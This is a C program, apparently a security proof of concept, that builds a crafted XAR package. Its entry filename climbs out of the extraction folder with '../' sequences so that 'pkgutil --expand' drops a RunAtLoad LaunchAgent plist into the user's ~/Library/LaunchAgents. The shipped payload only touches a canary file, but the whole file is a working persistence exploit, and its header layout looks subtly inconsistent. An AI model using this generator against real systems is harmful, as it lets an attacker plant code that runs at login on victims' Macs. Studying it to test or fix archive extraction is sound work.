/*
 * build_xar_r40.c — Gate B: dot-dot traversal → ~/Library/LaunchAgents/
 *
 * Target: pkgutil --expand writes to
 *   $OUTDIR/../../../../../../Users/runner/Library/LaunchAgents/xar_gate_b.plist
 * = ~/Library/LaunchAgents/xar_gate_b.plist
 *
 * This demonstrates a real persistence vector on macOS.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <zlib.h>
#include <CommonCrypto/CommonDigest.h>

#define MAGIC   0x78617221u
#define VERSION 1

static uint64_t be64(uint64_t v){
    return ((v&0xff)<<56)|((v&0xff00)<<40)|((v&0xff0000)<<24)|((v&0xff000000)<<8)|
           ((v>>8)&0xff0000)|((v>>24)&0xff00)|((v>>40)&0xff)|((v>>56));
}
static uint32_t be32(uint32_t v){
    return ((v&0xff)<<24)|((v&0xff00)<<8)|((v>>8)&0xff00)|((v>>24)&0xff);
}
static uint16_t be16(uint16_t v){ return (uint16_t)(((v&0xff)<<8)|(v>>8)); }

int main(int argc, char **argv){
    if(argc!=2){fprintf(stderr,"Usage: %s out.xar\n",argv[0]);return 1;}

    /* ── payload ── */
    const char *payload =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n"
        "  \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\">\n"
        "<dict>\n"
        "  <key>Label</key><string>com.xar.gate_b_canary</string>\n"
        "  <key>ProgramArguments</key>\n"
        "  <array><string>/usr/bin/touch</string>"
        "<string>/tmp/xar_gate_b_canary_macos.txt</string></array>\n"
        "  <key>RunAtLoad</key><true/>\n"
        "</dict>\n"
        "</plist>\n";
    size_t plen = strlen(payload);

    /* compress payload */
    uLongf czlen2 = compressBound((uLong)plen);
    unsigned char *cz2 = malloc(czlen2);
    if(compress(cz2,(uLongf*)&czlen2,(const Bytef*)payload,(uLong)plen)!=Z_OK){
        fprintf(stderr,"compress payload failed\n");return 1;
    }

    /*
     * ── filename: 6 levels of ../ to escape out of /tmp/<mktemp>/out/
     *    /tmp/<mktemp>/out/../../../../../../Users/runner/Library/LaunchAgents/xar_gate_b.plist
     *    = /Users/runner/Library/LaunchAgents/xar_gate_b.plist
     */
    const char *fname =
        "../../../../../../Users/runner/Library/LaunchAgents/xar_gate_b.plist";

    /* ── TOC ── */
    char toc_xml[4096];
    int toc_len = snprintf(toc_xml, sizeof(toc_xml),
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<xar><toc>"
        "<checksum style=\"sha1\"><offset>0</offset><size>20</size></checksum>"
        "<file id=\"1\">"
          "<name>%s</name>"
          "<type>file</type>"
          "<data>"
            "<offset>20</offset>"
            "<size>%zu</size>"
            "<length>%zu</length>"
            "<encoding style=\"application/x-gzip\"/>"
          "</data>"
        "</file>"
        "</toc></xar>\n",
        fname, plen, czlen2);

    /* compress TOC */
    uLongf toc_czlen = compressBound((uLong)toc_len);
    unsigned char *toc_cz = malloc(toc_czlen);
    if(compress(toc_cz,(uLongf*)&toc_czlen,(const Bytef*)toc_xml,(uLong)toc_len)!=Z_OK){
        fprintf(stderr,"compress TOC failed\n");return 1;
    }

    /* SHA1 of compressed TOC */
    unsigned char sha1[CC_SHA1_DIGEST_LENGTH];
    CC_SHA1(toc_cz,(CC_LONG)toc_czlen,sha1);

    /* heap = sha1(20) + compressed_payload */
    size_t heap_len = 20 + czlen2;
    unsigned char *heap = malloc(heap_len);
    memcpy(heap, sha1, 20);
    memcpy(heap+20, cz2, czlen2);

    /* header */
    uint32_t hdr_size = 28;
    struct { uint32_t magic,size,version; uint64_t toc_cz,toc_uz; uint32_t cksum_algo; } hdr;
    hdr.magic       = be32(MAGIC);
    hdr.size        = be32(hdr_size);
    hdr.version     = be16(VERSION);
    hdr.toc_cz      = be64(toc_czlen);
    hdr.toc_uz      = be64((uint64_t)toc_len);
    hdr.cksum_algo  = be32(1); /* SHA1 */

    FILE *f = fopen(argv[1],"wb");
    if(!f){perror("fopen");return 1;}
    fwrite(&hdr, sizeof(hdr), 1, f);
    fwrite(toc_cz, 1, toc_czlen, f);
    fwrite(heap, 1, heap_len, f);
    fclose(f);

    fprintf(stderr,"Written: %s (TOC %zu bytes compressed, payload %zu→%zu bytes)\n",
            argv[1],(size_t)toc_czlen,plen,(size_t)czlen2);
    free(toc_cz); free(cz2); free(heap);
    return 0;
}
